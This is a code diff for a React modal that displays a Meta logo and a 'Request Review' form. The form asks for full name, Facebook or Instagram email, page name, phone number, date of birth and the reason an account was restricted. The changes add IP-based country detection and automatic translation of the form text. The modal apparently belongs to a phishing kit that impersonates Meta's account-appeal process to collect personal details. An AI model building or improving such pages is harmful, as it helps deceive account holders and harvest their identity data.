@@ -1,15 +1,16 @@
 'use client';
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { useTranslation } from '@/utils/use-translation';
 import { store } from '@/store/store';
+import { getTranslations } from '@/utils/translate';
+import { COUNTRY_TO_LANGUAGE, type LanguageCode } from '@/utils/country-language-map';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import dynamic from 'next/dynamic';
 import 'intl-tel-input/styles';
 import Image from 'next/image';
-import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';
+import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState, useEffect } from 'react';
 
 const IntlTelInput = dynamic(() => import('intl-tel-input/reactWithUtils'), { ssr: false });
 
@@ -38,6 +39,8 @@ const FORM_FIELDS: FormField[] = [
 const InitModal: FC = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
+    const [countryCode, setCountryCode] = useState('US');
+    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
         pageName: '',
@@ -50,12 +53,117 @@ const InitModal: FC = () => {
     });
 
     const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
-    const { t } = useTranslation();
-    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
+
+    // Geo-detection effect
+    useEffect(() => {
+        const fetchGeoInfo = async () => {
+            try {
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const cc = (data.country_code || 'US').toUpperCase();
+                setCountryCode(cc);
+            } catch {
+                setCountryCode('US');
+            }
+        };
+        fetchGeoInfo();
+    }, []);
+
+    // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
+    useEffect(() => {
+        if (!countryCode) return;
+
+        (async () => {
+            const lang = (COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en') as LanguageCode;
+            if (lang === 'en') {
+                setTranslations({});
+                return;
+            }
+
+            // Get hardcoded translations first
+            const hardcodedTrans = getTranslations(lang) || {};
+            setTranslations(hardcodedTrans);
+
+            // Identify all texts used in this modal
+            const allTextsNeeded = [
+                'Request Review',
+                'Full Name',
+                'Personal Email Facebook or Instagram',
+                'Page Name',
+                'Mobile phone number',
+                'Date of birth',
+                'Day',
+                'Month',
+                'Year',
+                'January',
+                'February',
+                'March',
+                'April',
+                'May',
+                'June',
+                'July',
+                'August',
+                'September',
+                'October',
+                'November',
+                'December',
+                'Why are you requesting a review?',
+                "I'm not sure which policy was violated.",
+                'I think there was unauthorized use of my account.',
+                'Another reason:',
+                'Please describe your reason',
+                'Submit',
+                'DD',
+                'MM',
+                'YYYY'
+            ];
+
+            // Find missing texts not in hardcoded translations
+            const missingTexts = allTextsNeeded.filter(text => !hardcodedTrans[text]);
+            if (missingTexts.length === 0) return;
+
+            // Get cache for this language
+            const CACHE_KEY = `translation_cache_${lang}`;
+            const cache: Record<string, string> = localStorage.getItem(CACHE_KEY)
+                ? JSON.parse(localStorage.getItem(CACHE_KEY)!)
+                : {};
+
+            // Fetch missing texts from Google Translate API
+            const results = await Promise.all(
+                missingTexts.map(async (text) => {
+                    if (cache[text]) return { text, translated: cache[text] };
+                    try {
+                        const res = await axios.get('https://translate.googleapis.com/translate_a/single', {
+                            params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text },
+                            timeout: 3000
+                        });
+                        const translated = res.data[0]?.map((item: string[]) => item[0]).filter(Boolean).join('') || text;
+                        cache[text] = translated;
+                        return { text, translated };
+                    } catch {
+                        return { text, translated: text };
+                    }
+                })
+            );
+
+            // Cache the results
+            localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
+
+            // Merge hardcoded and API translations
+            const apiTranslations: Record<string, string> = {};
+            results.forEach(({ text, translated }) => {
+                apiTranslations[text] = translated;
+            });
+
+            const mergedTranslations = { ...hardcodedTrans, ...apiTranslations };
+            setTranslations(mergedTranslations);
+        })();
+    }, [countryCode]);
+
+    const t = (text: string): string => translations[text] || text;
 
     const initOptions = useMemo(
         () => ({
-            initialCountry: countryCode as '',
+            initialCountry: countryCode.toLowerCase() as '',
             separateDialCode: true,
             strictMode: true,
             nationalMode: true,
